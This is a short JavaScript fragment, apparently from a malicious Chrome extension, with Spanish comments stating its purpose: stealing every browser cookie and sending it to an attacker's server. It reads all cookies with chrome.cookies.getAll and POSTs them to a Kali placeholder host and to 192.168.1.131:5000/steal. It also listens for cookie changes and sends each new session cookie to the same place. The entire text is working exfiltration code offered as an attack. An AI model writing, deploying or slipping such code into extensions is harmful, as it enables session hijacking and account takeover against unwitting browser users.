// Robar TODAS las cookies y enviarlas al servidor atacante
chrome.cookies.getAll({}, function(cookies) {
    console.log('[+] Robando cookies:', cookies.length, 'encontradas');
    fetch('http://[IP-DE-TU-KALI]:5000/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({type: 'cookies', data: cookies})
    }).catch(e => console.log('[-] Error enviando cookies:', e));
});

// Escuchar cambios en las cookies (para capturar nuevas sesiones)
chrome.cookies.onChanged.addListener(function(changeInfo) {
    console.log('[+] Cookie modificada:', changeInfo.cookie);
    fetch('http://192.168.1.131:5000/steal', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({type: 'cookie_change', data: changeInfo})
    }).catch(e => console.log('[-] Error:', e));
});
